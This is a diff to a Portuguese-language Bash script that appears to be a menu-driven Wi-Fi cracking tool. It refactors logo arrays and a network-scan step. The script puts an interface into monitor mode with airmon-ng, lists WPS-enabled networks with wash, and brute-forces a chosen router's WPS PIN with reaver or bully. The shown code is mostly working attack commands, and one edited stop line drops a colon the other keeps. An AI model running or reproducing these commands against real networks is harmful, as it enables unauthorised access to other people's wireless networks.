@@ -70,29 +70,7 @@ Vd="\033[32;1m"
 Cy="\033[0;36m"
 Fm="\e[0m"
 
-readonly LOGO=(
-"  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗"
-" ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝"
-" ██║  ███╗███████║██║   ██║███████╗   ██║"
-" ██║   ██║██╔══██║██║   ██║╚════██║   ██║"
-" ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║"
-"  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝")
-
-readonly LOGO1=(
-"██╗    ██╗██╗███████╗██╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗"
-"██║    ██║██║██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝"
-"██║ █╗ ██║██║█████╗  ██║██║     ██████╔╝███████║██║     █████╔╝"
-"██║███╗██║██║██╔══╝  ██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗"
-"╚███╔███╔╝██║██║     ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗"
-" ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")
-
-readonly LOGO2=(
-"███╗   ██╗███╗   ███╗ █████╗ ██████╗"
-"████╗  ██║████╗ ████║██╔══██╗██╔══██╗"
-"██╔██╗ ██║██╔████╔██║███████║██████╔╝"
-"██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝"
-"██║ ╚████║██║ ╚═╝ ██║██║  ██║██║"     
-"╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝")
+source logos.sh
 
 #===============================================================#
 # Verifica se o usuário está logado como root
@@ -406,6 +384,11 @@ airmon_func() {
   sleep 3s
   sudo airmon-ng start ${LAN[$P]%%:*} && clear
   echo -e ${Rd}"OBTENDO REDES WIFI DISPONIVEIS, O PROCESSO LEVARÁ 30 SEGUNDOS\n"${Fm}
+
+}
+
+wash_func() {
+
   sleep 2s
   sudo timeout --preserve-status 30 wash -i  ${LAN[$P]%%:*}mon 
   read -p $'\033[31;1m\nCOPIE E COLE O MAC DA REDE ESCOLHIDA R: \033[m' mac
@@ -416,21 +399,23 @@ airmon_func() {
 bully_func() {
 
   airmon_func
+  wash_func
   bully ${LAN[$P]%%:*}mon -b$mac -c$canal -d -A -F -B -l 5
   echo -e ${Rd}"RETORNAR?"${Fm}${Rd} "[${Fm}${Br}S/N${Fm}${Rd}]"${Fm}
   read -p $'\033[1;37mR: \033[m' RES
 
-  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${wlan}
+  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${LAN[$P]%%*}mon
 }
 
 reaver_func() {
 
   airmon_func
+  wash_func
   reaver -c$canal -b$mac -vv -i ${LAN[$P]%%:*}mon -L -Z -K 1
   echo -e ${Rd}"RETORNAR?"${Fm}${Rd} "[${Fm}${Br}S/N${Fm}${Rd}]"${Fm}
   read -p $'\033[1;37mR: \033[m' RES
 
-  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${wlan}
+  [[ "$RES" == @(s|S) ]] && retorno_func || airmonstop_func ${LAN[$P]%%:*}mon
 }
 
 MenuWificrack_func() {
@@ -448,7 +433,7 @@ MenuWificrack_func() {
     echo -e ${Rd}"\n=============================================================================="${Fm}
     echo -e ${Rd}" [0]"${Fm}${Br}" Para sair"${Fm}
     echo -e ${Rd}" [1]"${Fm}${Br}" Quebra do PIN WPS com REAVER"${Fm}
-    echo -e ${Rd}" [2]"${Fm}${Br}" Quebra do PIN WPS com BULLY"${Fm} 
+    echo -e ${Rd}" [2]"${Fm}${Br}" Quebra do PIN WPS com BULLY"${Fm}
     echo -e ${Rd}"=============================================================================="${Fm}
     echo -e ${Red}"ESCOLHA UMA DAS OPÇÕES DO MENU ACIMA"${Fm}
 
@@ -468,7 +453,6 @@ MenuWificrack_func() {
     [[ "${inicio,,}" == @(s|sim) ]] && MenuWificrack_func || exit_func
   
   done
-
 }
 
 Menu() {
